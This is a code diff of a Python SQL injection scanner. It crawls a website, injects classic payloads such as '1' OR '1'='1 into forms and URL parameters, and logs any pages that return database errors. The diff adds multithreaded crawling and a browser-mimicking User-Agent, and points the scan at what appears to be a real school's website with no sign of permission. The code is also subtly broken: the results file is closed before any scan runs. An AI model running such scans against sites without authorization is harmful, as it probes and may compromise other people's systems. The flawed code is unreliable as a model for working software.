@@ -1,18 +1,40 @@
-# Import necessary libraries
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse, parse_qs
+import logging
+import datetime
+from concurrent.futures import ThreadPoolExecutor
 
-# Create a session with headers to mimic a web browser
-s = requests.Session()
-s.headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+# Create a timestamp for the log file
+timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
 
-def get_forms(url):
-    soup = BeautifulSoup(s.get(url).content, "html.parser")
-    return soup.find_all("form")
+# Configure logging with the timestamp in the filename
+logging.basicConfig(filename=f'scan_log_{timestamp}.txt', level=logging.INFO)
+
+# Create a separate file for storing vulnerable data
+vulnerable_data_file = open(f'vulnerable_data_{timestamp}.txt', 'w')
+
+def get_forms_from_url(url, session):
+    try:
+        response = session.get(url)
+        response.raise_for_status()
+        soup = BeautifulSoup(response.content, "html.parser")
+        return soup.find_all("form")
+    except requests.RequestException as e:
+        logging.error(f"Error retrieving forms from {url}: {e}")
+        return []
 
 def form_details(form):
-    detailsOfForm = {}
+    """
+    Extract details of a form, including action, method, and input fields.
+
+    Parameters:
+        form (bs4.element.Tag): The BeautifulSoup Tag representing the HTML form.
+
+    Returns:
+        dict: Details of the form.
+    """
+    details_of_form = {}
     action = form.attrs.get("action")
     method = form.attrs.get("method", "get")
     inputs = []
@@ -23,28 +45,39 @@ def form_details(form):
         input_value = input_tag.attrs.get("value", "")
         inputs.append({
             "type": input_type,
-            "name" : input_name,
-            "value" : input_value,
+            "name": input_name,
+            "value": input_value,
         })
 
-    detailsOfForm['action'] = action
-    detailsOfForm['method'] = method
-    detailsOfForm['inputs'] = inputs
-    return detailsOfForm
+    details_of_form['action'] = action
+    details_of_form['method'] = method
+    details_of_form['inputs'] = inputs
+    return details_of_form
 
-def vulnerable(response):
+def vulnerable(response, url, payload):
     errors = {"quoted string not properly terminated",
-              "unclosed quotation mark after the charachter string",
-              "you have an error in you SQL syntax"
+              "unclosed quotation mark after the character string",
+              "you have an error in your SQL syntax"
              }
     for error in errors:
         if error in response.content.decode().lower():
+            logging.warning(f"Vulnerability detected: {error}")
+
+            # Log the vulnerability details to a separate file
+            vulnerable_data_file.write(f"Vulnerability detected: {error}\n")
+            vulnerable_data_file.write(f"URL: {url}\n")
+            vulnerable_data_file.write(f"Payload: {payload}\n\n")
             return True
     return False
 
-def sql_injection_scan(url):
-    forms = get_forms(url)
-    print(f"[+] Detected {len(forms)} forms on {url}.")
+def sql_injection_scan(url, session):
+    forms = get_forms_from_url(url, session)
+
+    if not forms:
+        logging.info(f"No forms found on {url}. Exiting.")
+        return
+
+    logging.info(f"[+] Detected {len(forms)} forms on {url}.")
 
     # SQL injection payload variations for form testing
     payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1; --", "1\" OR 1=1; --"]
@@ -61,18 +94,18 @@ def sql_injection_scan(url):
                 elif input_tag["type"] != "submit":
                     data[input_tag['name']] = f"test{payload}"
 
-            print(url)
-            form_details(form)
+            logging.info(f"\nScanning {url}")
+            logging.info(f"Testing form: {details['action']} (Method: {details['method']})")
 
             if details["method"] == "post":
-                res = s.post(url, data=data)
+                res = session.post(url, data=data)
             elif details["method"] == "get":
-                res = s.get(url, params=data)
+                res = session.get(url, params=data)
 
-            if vulnerable(res):
-                print(f"SQL injection attack vulnerability found with payload '{payload}' in link: {url}")
+            if vulnerable(res, url, payload):
+                logging.warning(f"SQL injection attack vulnerability found with payload '{payload}'")
             else:
-                print(f"No SQL injection attack vulnerability detected with payload '{payload}'")
+                logging.info(f"No SQL injection attack vulnerability detected with payload '{payload}'")
 
         # SQL injection payload variations for URL parameter testing
         url_params = parse_qs(urlparse(url).query)
@@ -81,15 +114,59 @@ def sql_injection_scan(url):
             for value in values:
                 for payload in payloads:
                     modified_url = url.replace(f"{param}={value}", f"{param}={value}{payload}")
-                    res = s.get(modified_url)
+                    res = session.get(modified_url)
 
-                    if vulnerable(res):
-                        print(f"SQL injection attack vulnerability found with payload '{payload}' in URL: {modified_url}")
+                    if vulnerable(res, modified_url, payload):
+                        logging.warning(f"SQL injection attack vulnerability found with payload '{payload}' in URL: {modified_url}")
                     else:
-                        print(f"No SQL injection attack vulnerability detected with payload '{payload}' in URL: {modified_url}")
+                        logging.info(f"No SQL injection attack vulnerability detected with payload '{payload}' in URL: {modified_url}")
 
+def extract_links_from_page(url, session):
+    """
+    Extract all links from a given page.
+
+    Parameters:
+        url (str): The URL of the page.
+        session (requests.Session): The session to use for making HTTP requests.
+
+    Returns:
+        list: A list of URLs found on the page.
+    """
+    try:
+        response = session.get(url)
+        response.raise_for_status()
+        soup = BeautifulSoup(response.content, "html.parser")
+        links = [urljoin(url, a['href']) for a in soup.find_all('a', href=True)]
+        return links
+    except requests.RequestException as e:
+        print(f"Error extracting links from {url}: {e}")
+        return []
+
+def crawl_and_scan(start_url, session, depth=2, max_workers=5):
+    scanned_urls = set()
+
+    def recursive_crawl_and_scan(url, current_depth):
+        if current_depth > depth or url in scanned_urls:
+            return
+        scanned_urls.add(url)
+
+        logging.info(f"\nScanning {url}")
+        sql_injection_scan(url, session)
+
+        links = extract_links_from_page(url, session)
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            executor.map(recursive_crawl_and_scan, links, [current_depth + 1] * len(links))
+
+    recursive_crawl_and_scan(start_url, 1)
+
+# Close the vulnerable data file
+vulnerable_data_file.close()
 
 if __name__ == "__main__":
-    # Specify the URL to be checked for SQL injection vulnerability
-    urlToBeChecked = ""
-    sql_injection_scan(urlToBeChecked)
+    # Specify the starting URL to be checked for SQL injection vulnerability
+    startUrlToBeChecked = "https://www.learnandplaymontessori.com/"
+
+    # Create a session with headers to mimic a web browser
+    with requests.Session() as session:
+        session.headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+        crawl_and_scan(startUrlToBeChecked, session)
